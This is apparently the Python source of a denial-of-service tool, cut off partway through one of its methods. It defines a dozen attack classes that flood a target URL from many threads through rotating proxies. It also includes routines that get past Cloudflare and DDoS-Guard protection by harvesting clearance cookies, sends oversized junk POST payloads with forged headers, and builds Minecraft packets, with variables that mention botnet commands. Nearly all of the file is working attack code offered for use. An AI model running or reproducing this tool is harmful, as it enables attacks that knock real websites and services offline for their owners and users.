import httpx, threading, cloudscraper, requests
import argparse, socket
import undetected_chromedriver as uc
import random, datetime, time
import hashlib, base64, os
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from fake_useragent import UserAgent
from requests.cookies import RequestsCookieJar
from urllib.parse import urlparse
from os.path import exists
import time as tx
from multiprocessing import Process
from requests import Session, cookies
from uuid import UUID
from struct import pack as data_pack
from typing import Tuple

botnet_command = None
accept_command = None
listener = False
no_proxies=False

def clean_url(url):
    parsed = urlparse(url)

    cleaned = (parsed.netloc + parsed.path).rstrip('/')
    return cleaned

def random_data():
    random_payload = [
        {
            'A': base64.b64encode(
                    hashlib.sha256(('AAAAAAAAAAAAAAAAAAAAA' + str(random.randint(6000, 12000))).encode()).digest()
                ).decode() * 16384,
        },
        {
            'B': base64.b64encode(
                    hashlib.sha256(('BBBBBBBBBBBBBBBBBBBBB' + str(random.randint(6000, 12000))).encode()).digest()
                ).decode() * 16384,
        },
        {
            'C': base64.b64encode(
                    hashlib.sha256(('CCCCCCCCCCCCCCCCCCCCC' + str(random.randint(6000, 12000))).encode()).digest()
                ).decode() * 16384,
        }
    ]

    return random.choice(random_payload)

def random_headers():
    headers_list = [
        {
            'User-Agent': UserAgent().chrome,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
            'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary',
            'Content-Length': '500000000',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'TE': 'trailers',
        },
        {
            'User-Agent': UserAgent().chrome,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary',
            'Content-Length': '500000000',
        },
        {
            'User-Agent': UserAgent().chrome,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary',
            'Content-Length': '500000000',
            'Upgrade-Insecure-Requests': '200',
            'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
        }
    ]

    return random.choice(headers_list)

class Minecraft:
    @staticmethod
    def varint(d: int) -> bytes:
        o = b''
        while True:
            b = d & 0x7F
            d >>= 7
            o += data_pack("B", b | (0x80 if d > 0 else 0))
            if d == 0:
                break
        return o

    @staticmethod
    def data(*payload: bytes) -> bytes:
        payload = b''.join(payload)
        return Minecraft.varint(len(payload)) + payload

    @staticmethod
    def short(integer: int) -> bytes:
        return data_pack('>H', integer)

    @staticmethod
    def long(integer: int) -> bytes:
        return data_pack('>q', integer)

    @staticmethod
    def handshake(target: Tuple[str, int], version: int, state: int) -> bytes:
        return Minecraft.data(Minecraft.varint(0x00),
                              Minecraft.varint(version),
                              Minecraft.data(target[0].encode()),
                              Minecraft.short(target[1]),
                              Minecraft.varint(state))

    @staticmethod
    def handshake_forwarded(target: Tuple[str, int], version: int, state: int, ip: str, uuid: UUID) -> bytes:
        return Minecraft.data(Minecraft.varint(0x00),
                              Minecraft.varint(version),
                              Minecraft.data(
                                  target[0].encode(),
                                  b"\x00",
                                  ip.encode(),
                                  b"\x00",
                                  uuid.hex.encode()
                              ),
                              Minecraft.short(target[1]),
                              Minecraft.varint(state))

    @staticmethod
    def login(protocol: int, username: str) -> bytes:
        if isinstance(username, str):
            username = username.encode()
        return Minecraft.data(Minecraft.varint(0x00 if protocol >= 391 else \
                                               0x01 if protocol >= 385 else \
                                               0x00),
                              Minecraft.data(username))

    @staticmethod
    def keepalive(protocol: int, num_id: int) -> bytes:
        return Minecraft.data(Minecraft.varint(0x0F if protocol >= 755 else \
                                               0x10 if protocol >= 712 else \
                                               0x0F if protocol >= 471 else \
                                               0x10 if protocol >= 464 else \
                                               0x0E if protocol >= 389 else \
                                               0x0C if protocol >= 386 else \
                                               0x0B if protocol >= 345 else \
                                               0x0A if protocol >= 343 else \
                                               0x0B if protocol >= 336 else \
                                               0x0C if protocol >= 318 else \
                                               0x0B if protocol >= 107 else \
                                               0x00),
                              Minecraft.long(num_id) if protocol >= 339 else \
                              Minecraft.varint(num_id))

    @staticmethod
    def chat(protocol: int, message: str) -> bytes:
        return Minecraft.data(Minecraft.varint(0x03 if protocol >= 755 else \
                                               0x03 if protocol >= 464 else \
                                               0x02 if protocol >= 389 else \
                                               0x01 if protocol >= 343 else \
                                               0x02 if protocol >= 336 else \
                                               0x03 if protocol >= 318 else \
                                               0x02 if protocol >= 107 else \
                                               0x01),
                              Minecraft.data(message.encode()))

class solver():
    @staticmethod
    def close_connection(sock=None):
        if sock:
            sock.close()

    @staticmethod
    def sendto(sock, packet, tup: Tuple[str, int]):
        target, port = tup
        if not sock.sendto(packet, (target, port)):
            return False
        return True

    @staticmethod
    def dgb_solver(url, ua, pro=None):
        s = None
        idss = None
        with Session() as s:
            if pro:
                s.proxies = pro
            hdrs = {
                "User-Agent": ua,
                "Accept": "text/html",
                "Accept-Language": "en-US",
                "Connection": "keep-alive",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-User": "?1",
                "TE": "trailers",
                "DNT": "1"
            }
            with s.get(url, headers=hdrs) as ss:
                for key, value in ss.cookies.items():
                    s.cookies.set_cookie(cookies.create_cookie(key, value))
            hdrs = {
                "User-Agent": ua,
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Referer": url,
                "Sec-Fetch-Dest": "script",
                "Sec-Fetch-Mode": "no-cors",
                "Sec-Fetch-Site": "cross-site"
            }
            with s.post("https://check.ddos-guard.net/check.js", headers=hdrs) as ss:
                for key, value in ss.cookies.items():
                    if key == '__ddg2':
                        idss = value
                    s.cookies.set_cookie(cookies.create_cookie(key, value))

            hdrs = {
                "User-Agent": ua,
                "Accept": "image/webp,*/*",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Cache-Control": "no-cache",
                "Referer": url,
                "Sec-Fetch-Dest": "script",
                "Sec-Fetch-Mode": "no-cors",
                "Sec-Fetch-Site": "cross-site"
            }
            with s.get(f"{url}.well-known/ddos-guard/id/{idss}", headers=hdrs) as ss:
                for key, value in ss.cookies.items():
                    s.cookies.set_cookie(cookies.create_cookie(key, value))
                return s

        return False

def get_cookie_windows(url):
    global useragent, cookieJAR, cookie
    options = webdriver.ChromeOptions()
    arguments = [
    '--no-sandbox', '--disable-setuid-sandbox', '--disable-infobars', '--disable-logging', '--disable-login-animations',
    '--disable-notifications', '--disable-gpu', '--headless', '--lang=ko_KR', '--start-maxmized',
    '--user-agent=Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en' 
    ]
    for argument in arguments:
        options.add_argument(argument)
    driver = webdriver.Chrome(options=options)
    driver.implicitly_wait(3)
    driver.get(url)
    for _ in range(60):
        cookies = driver.get_cookies()
        tryy = 0
        for i in cookies:
            if i['name'] == 'cf_clearance':
                cookieJAR = driver.get_cookies()[tryy]
                useragent = driver.execute_script("return navigator.userAgent")
                cookie = f"{cookieJAR['name']}={cookieJAR['value']}"
                driver.quit()
                return True
            else:
                tryy += 1
                pass
        time.sleep(1)
    driver.quit()
    return False

def get_cookies_linux(url):
    global cookieJAR
    session = requests.Session()
    headers = {
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en'
    }
    cookie_jar = RequestsCookieJar()
    response = session.get(url, headers=headers, cookies=cookie_jar)
    cookie_jar.update(session.cookies)
    for cookie in cookie_jar:
        cookieJAR=f"{cookie.name}={cookie.value}"
        cookieJAR = {
            'name': cookie.name,
            'value': cookie.value
        }

    return cookie_jar

class meltodown:
    def __init__(self, url, **kwargs):
        self.url = url
        self.user_agent = kwargs.get('user_agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3')
        self.timeout = kwargs.get('timeout', {})
        self.verify = kwargs.get('verify', {})
        self.proxies = kwargs.get('proxies', {})
        self.client = None
        self.scraper = None
    def __enter__(self):
        try:
            self.client = httpx.Client(timeout=self.timeout, verify=self.verify, proxies=self.proxies, headers={'User-Agent': self.user_agent})
        except Exception as e:
            self.client = None

        try:
            self.scraper = cloudscraper.create_scraper()
        except Exception as e:
            self.scraper = None

        if self.client is None and self.scraper is None:
            raise ValueError("Neither HTTPX Client nor Cloudscraper is initialized.")

        return self

    def __exit__(self, exc_type, exc_value, traceback):
        if self.client:
            self.client.close()

    def _send_request(self, method, data=None, **kwargs):
        headers = {'User-Agent': self.user_agent}
        headers.update(kwargs.get('headers', {}))

        try:
            if self.client:
                if method == 'GET':
                    response = self.client.get(self.url, headers=headers)
                elif method == 'POST':
                    headers['Content-Type'] = 'application/json'
                    response = self.client.post(self.url, headers=headers, data=data)
                else:
                    raise ValueError("Invalid HTTP method specified")
            elif self.scraper:
                if method == 'GET':
                    response = self.scraper.get(self.url, headers=headers, timeout=self.timeout, proxies=self.proxies)
                    response = requests.get(self.url, headers=headers, timeout=self.timeout, proxies=self.proxies)
                elif method == 'POST':
                    response = self.scraper.post(self.url, headers=headers, data=data, timeout=self.timeout, proxies=self.proxies)
                    response = requests.post(self.url, headers=headers, data=data, timeout=self.timeout, proxies=self.proxies)
                else:
                    raise ValueError("Invalid HTTP method specified")
            else:
                raise ValueError("Neither HTTPX Client or Cloudscraper is initialized.")

            response.raise_for_status()
            return response.text
        except Exception as e:
            pass

    def get(self, **kwargs):
        return self._send_request('GET', **kwargs)

    def post(self, data, **kwargs):
        return self._send_request('POST', data, **kwargs)

class Method:
    class PXHTTP2:
        def __init__(self, url, thread, time, proxy):
            self.proxy = open(proxy, 'r').readlines() if not listener else proxy
            self.url = url
            self.thread = thread
            self.time = time
        def Attack(self):
            headers = {
                'User-Agent': UserAgent().chrome,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'TE': 'trailers',
                }
            until = datetime.datetime.now() + datetime.timedelta(seconds=int(self.time))
            for _ in range(int(self.thread)):
                threading.Thread(target=self.AttackPXHTTP2, args=(until, headers)).start()
        def AttackPXHTTP2(self, until_datetime, headers):
            while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
                try:
                    self.proxyes = str(random.choice(self.proxy))
                    self.launcher = httpx.Client(
                        http2=True,
                        proxies={
                            "http": f"http://{self.proxyes}",
                            "https": f"http://{self.proxyes}",
                        }
                    ) if not no_proxies else httpx.Client(http2=True)
                    self.launcher.get(self.url, headers=headers)
                    self.launcher.get(self.url, headers=headers)
                except Exception as e:
                    print(e)
                    pass
        def start(self):
            return self.Attack()

    class HTTP2:
        def __init__(self, url, thread, time):
            self.url = url
            self.thread = thread
            self.time = time
        def Attack(self):
            headers = {
                'User-Agent': UserAgent().chrome,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'TE': 'trailers',
                }
            until = datetime.datetime.now() + datetime.timedelta(seconds=int(self.time))
            for _ in range(int(self.thread)):
                threading.Thread(target=self.AttackHTTP2, args=(until, headers)).start()
        def AttackHTTP2(self, until_datetime, headers):
            while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
                try:
                    self.launcher = httpx.Client(http2=True)
                    self.launcher.get(self.url, headers=headers)
                    self.launcher.get(self.url, headers=headers)
                except Exception as e:
                    print(e)
                    pass
        def start(self):
            return self.Attack()

    class PXCFB:
        def __init__(self, url, thread, time, proxy):
            self.proxy = open(proxy, 'r').readlines() if not listener else proxy
            self.url = url
            self.thread = thread
            self.time = time
            self.scraper = cloudscraper.create_scraper(disableCloudflareV1=True)
        def Attack(self):
            until = datetime.datetime.now() + datetime.timedelta(seconds=int(self.time))
            threads = []
            for _ in range(int(self.thread)):
                threading.Thread(target=self.AttackPXCFB, args=(self.url, until)).start()
        def AttackPXCFB(self, url, until_datetime):
            while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
                headers = {
                    'User-Agent': UserAgent().chrome,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                    'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                    'Sec-Fetch-Dest': 'document',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-Site': 'same-origin',
                    'Sec-Fetch-User': '?1',
                    'TE': 'trailers',
                }
                try:
                    self.scraper.get(url, proxies={
                            'http': 'http://'+str(random.choice(self.proxy)),
                            'https': 'http://'+str(random.choice(self.proxy)),
                    }, headers=headers) if not no_proxies else self.scraper.get(url, headers=headers)
                    self.scraper.get(url, proxies={
                            'http': 'http://'+str(random.choice(self.proxy)),
                            'https': 'http://'+str(random.choice(self.proxy)),
                    }, headers=headers) if not no_proxies else self.scraper.get(url, headers=headers)
                except Exception as e:
                    print(e)
                    pass
        def start(self):
            return self.Attack()

    class PXREQ:
        def __init__(self, url, thread, time, proxy):
            self.proxy = open(proxy, 'r').readlines() if not listener else proxy
            self.url = url
            self.thread = thread
            self.time = time
        def Attack(self):
            headers = {
                'User-Agent': UserAgent().chrome,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'TE': 'trailers',
            }
            until = datetime.datetime.now() + datetime.timedelta(seconds=int(self.time))
            for _ in range(int(self.thread)):
                threading.Thread(target=self.AttackPXREQ, args=(self.url, headers, until)).start()
        def AttackPXREQ(self, url, headers, until_datetime):
            while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
                try:
                    proxy = {
                            'http': 'http://'+str(random.choice(self.proxy)),
                            'https': 'http://'+str(random.choice(self.proxy)),
                    }
                    requests.get(url, proxies=proxy, headers=headers) if not no_proxies else requests.get(url, headers=headers)
                    requests.get(url, proxies=proxy, headers=headers) if not no_proxies else requests.get(url, headers=headers)
                except Exception as e:
                    pass
        def start(self):
            return self.Attack()

    class PXBYP:
        def __init__(self, url, thread, time, proxy):
            self.proxy = open(proxy, 'r').readlines() if not listener else proxy
            self.url = url
            self.thread = thread
            self.time = time
            self.scraper = cloudscraper.create_scraper(disableCloudflareV1=True, delay=10)
        def Attack(self):
            headers = {
                'User-Agent': UserAgent().chrome,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'TE': 'trailers',
            }
            until = datetime.datetime.now() + datetime.timedelta(seconds=int(self.time))
            for _ in range(int(self.thread)):
                threading.Thread(target=self.AttackBYP, args=(self.url, until, headers)).start()
        def AttackBYP(self, url, until_datetime, headers):
            while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
                try:
                    proxy = {
                            'http': 'http://'+str(random.choice(self.proxy)),
                            'https': 'http://'+str(random.choice(self.proxy)),
                    }
                    requests.get(url, proxies=proxy, verify=False) if not no_proxies else requests.get(url, verify=False)
                    self.scraper.get(url, proxies=proxy, verify=False) if not no_proxies else self.scraper.get(url, proxies=proxy, verify=False)
                    self.launcher = httpx.Client(
                        http2=True,
                        proxies={
                            'http': 'http://'+str(random.choice(self.proxy)),
                            'https': 'http://'+str(random.choice(self.proxy)),
                        }, verify=False
                    ) if not no_proxies else httpx.Client(http2=True, verify=False)
                    self.launcher.get(url, headers=headers)
                    with solver.dgb_solver(url, UserAgent().chrome) as ss:
                        ss.get(url, UserAgent().chrome)
                except Exception as e:
                    print(e)
                    pass
        def start(self):
            return self.Attack()

    class PXROCKET:
        def __init__(self, url, thread, time, proxy):
            self.proxy = open(proxy, 'r').readlines() if not listener else proxy
            self.url = url
            self.thread = thread
            self.time = time

        # Memulai thread untuk melakukan attack
        def Attack(self):
            until = datetime.datetime.now() + datetime.timedelta(seconds=int(self.time))
            for _ in range(int(self.thread)):
                threading.Thread(target=self.PXROCKET, args=(self.url, until)).start()

        def PXROCKET(self, url, until_datetime):
            while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
                try:
                    options = webdriver.ChromeOptions()
                    options.add_argument(f"--proxy-server={str(random.choice(self.proxy))}")  # Tambahkan proxy
                    options.headless = True
                    driver = uc.Chrome(options=options)
                    driver.get(url)
                except Exception as e:
                    print(e)
                    pass

        def start(self):
            return self.Attack()

    class PXMIX:
        def __init__(self, url, thread, time, proxy):
            self.proxy = open(proxy, 'r').readlines() if not listener else proxy
            self.url = url
            self.thread = thread
            self.time = time
            self.scraper = cloudscraper.create_scraper(disableCloudflareV1=True, browser='chrome', delay=6, captcha={'provider': 'return_response'})

        # Memulai thread untuk melakukan attack
        def Attack(self):
            headers = {
                'User-Agent': UserAgent().chrome,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'TE': 'trailers',
            }
            until = datetime.datetime.now() + datetime.timedelta(seconds=int(self.time))
            for _ in range(int(self.thread)):
                threading.Thread(target=self.PXMIX, args=(self.url, until, headers)).start()

        def PXMIX(self, url, until_datetime, headers):
            while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
                try:
                    requests.get(url, proxies={
                            'http': 'http://'+str(random.choice(self.proxy)),
                            'https': 'http://'+str(random.choice(self.proxy)),
                        }, headers=headers)
                    self.scraper.get(url, proxies={
                            'http': 'http://'+str(random.choice(self.proxy)),
                            'https': 'http://'+str(random.choice(self.proxy)),
                        }, headers=headers)
                    self.launcher = httpx.Client(
                        http2=True,
                        proxies={
                            'http': 'http://'+str(random.choice(self.proxy)),
                            'https': 'http://'+str(random.choice(self.proxy)),
                        }
                    )
                    self.launcher.get(self.url, headers=headers)
                except Exception as e:
                    print(e)
                    pass

        def start(self):
            return self.Attack()

    class PXCFPRO:
        def __init__(self, url, thread, time, proxy):
            self.proxy = open(proxy, 'r').readlines() if not listener else proxy
            self.url = url
            self.thread = thread
            self.time = time
            self.session = requests.Session()
            self.scraper = cloudscraper.create_scraper(disableCloudflareV1=True, sess=self.session, browser='chrome', delay=10)
            try:
                get_cookie_windows(str(args.url)) if os.name == 'nt' else get_cookies_linux(str(args.url))
                if cookieJAR:
                    jar = RequestsCookieJar()
                    jar.set(cookieJAR['name'], cookieJAR['value'])
                    self.scraper.cookies = jar
                else:
                    pass
            except:
                pass

        # Memulai thread untuk melakukan attack
        def Attack(self):
            headers = {
                'User-Agent': UserAgent().chrome,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'TE': 'trailers',
            }
            until = datetime.datetime.now() + datetime.timedelta(seconds=int(self.time))
            for _ in range(int(self.thread)):
                threading.Thread(target=self.PXCFPRO, args=(self.url, until, headers)).start()

        def PXCFPRO(self, url, until_datetime, headers):
            while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
                try:
                    self.scraper.get(url, headers=headers, proxies={
                            'http': 'http://'+str(random.choice(self.proxy)),
                            'https': 'http://'+str(random.choice(self.proxy)),
                        }) if not no_proxies else self.scraper.get(url, headers=headers)
                    self.scraper.get(url, headers=headers, proxies={
                            'http': 'http://'+str(random.choice(self.proxy)),
                            'https': 'http://'+str(random.choice(self.proxy)),
                        }) if not no_proxies else self.scraper.get(url, headers=headers)
                except Exception as e:
                    print(e)
                    pass

        def start(self):
            return self.Attack()

    class PXKILL:
        def __init__(self, url, thread, time, proxy):
            self.proxy = open(proxy, 'r').readlines() if not listener else proxy
            self.url = url
            self.thread = thread
            self.time = time
            self.scraper = cloudscraper.create_scraper()

        # Memulai thread untuk melakukan attack
        def Attack(self):
            until = datetime.datetime.now() + datetime.timedelta(seconds=int(self.time))
            for _ in range(int(self.thread)):
                threading.Thread(target=self.PXKILL, args=(self.url, until)).start()

        def PXKILL(self, url, until_datetime):
            while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
                headers = random_headers()
                payload = random_data()
                try:
                    self.scraper.post(url, headers=headers, data=payload, proxies={
                            'http': 'http://'+str(random.choice(self.proxy)),
                            'https': 'http://'+str(random.choice(self.proxy)),
                        }) if not no_proxies else self.scraper.post(url, headers=headers, data=payload)
                    requests.post(url, headers=headers, data=payload, proxies={
                            'http': 'http://'+str(random.choice(self.proxy)),
                            'https': 'http://'+str(random.choice(self.proxy)),
                        }) if not no_proxies else requests.post(url, headers=headers, data=payload)
                except Exception as e:
                    print(e)
                    pass

        def start(self):
            return self.Attack()

    class PXSOC:
        def __init__(self, url, thread, time, proxy):
            self.proxy = open(proxy, 'r').readlines() if not listener else proxy
            self.url = url
            self.thread = thread
            self.time = time

        # Memulai thread untuk melakukan attack
        def Attack(self):
            until = datetime.datetime.now() + datetime.timedelta(seconds=int(self.time))
            for _ in range(int(self.thread)):
                threading.Thread(target=self.PXSOC, args=(self.url, until)).start()

        def PXSOC(self, url, until_datetime):
            while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
                try:
                    clean = clean_url(url)
                    self.port = urlparse(url).port or (443 if urlparse(url).scheme == 'https' else 80)
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    parsed_proxy = random_data()
                    request = (
                        f"GET / HTTP/1.1\r\n"
                        f"Host: {clean}\r\n"
                        f"User-Agent: {UserAgent().chrome}\r\n"
                        f"X-Forwarded-For: {parsed_proxy[0]}\r\n"
                        f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n"
                        f"Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7\r\n"
                        f"Accept-Encoding: deflate, gzip;q=1.0, *;q=0.5\r\n"
                        f"Cache-Control: no-cache\r\n"
                        f"Pragma: no-cache\r\n"
                        f"Connection: keep-alive\r\n"
                        f"Upgrade-Insecure-Requests: 1\r\n"
                        f"Sec-Fetch-Dest: document\r\n"
                        f"Sec-Fetch-Mode: navigate\r\n"
                        f"Sec-Fetch-Site: same-origin\r\n"
                        f"Sec-Fetch-User: ?1\r\n"
                        f"TE: trailers\r\n\r\n"
                    )
                    try:
                        sock.sendto(request.encode(), (clean, self.port))
                        sock.sendto(request.encode(), (clean, self.port))
                    except:
                        sock.close()
                except Exception as e:
                    print(e)
                    pass

        def start(self):
            return Process(target=self.Attack).start()

    class PXMELTED:
        def __init__(self, url, thread, time, proxy):
            self.proxy = open(proxy, 'r').readlines() if not listener else proxy
            self.url = url
            self.thread = thread
            self.time = time

        def Attack(self):
            until = datetime.datetime.now() + datetime.timedelta(seconds=int(self.time))
            for _ in range(int(self.thread)):
                threading.Thread(target=self.AttackPXMELTED, args=(self.url, until)).start()

        def AttackPXMELTED(self, url, until_datetime):
            while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
                headers = {
                    'User-Agent': UserAgent().chrome,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                    'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                    'Sec-Fetch-Dest': 'document',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-Site': 'same-origin',
                    'Sec-Fetch-User': '?1',
                    'TE': 'trailers',
                }
                try:
                    if not no_proxies:
                        with meltodown(url, proxies={
                                'http': 'http://'+str(random.choice(self.proxy)),
                                'https': 'http://'+str(random.choice(self.proxy)),
                            }, headers=headers, timeout=30) as scrape:
                            scrape.get()
                            for _ in range(200):
                                scrape.get()
                    else:
                        with meltodown(url, headers=headers, timeout=30) as scrape:
                            scrape.get()
                            for _ in range(200):
                                scrape.get()
                except Exception as e:
                    print(e)
                    pass

        def start(self):
            return self.Attack()

    class PXFUCK:
        def __init__(self, url, thread, time, proxy):
            self.proxy = open(proxy, 'r').readlines() if not listener else proxy
            self.url = url
            self.thread = thread
            self.time = time
        def Attack(self):
            until = datetime.datetime.now() + datetime.timedelta(seconds=int(self.time))
            for _ in range(int(self.thread)):
                threading.Thread(target=self.AttackPXFUCK, args=(self.url, until)).start()
        def AttackPXFUCK(self, url, until_datetime):
            headers = {
                'User-Agent': UserAgent().chrome,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'TE': 'trailers',
            }
            while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
                try:
                    proxy = {
                            'http': 'http://'+str(random.choice(self.proxy)),
                            'https': 'http://'+str(random.choice(self.proxy)),
                    }
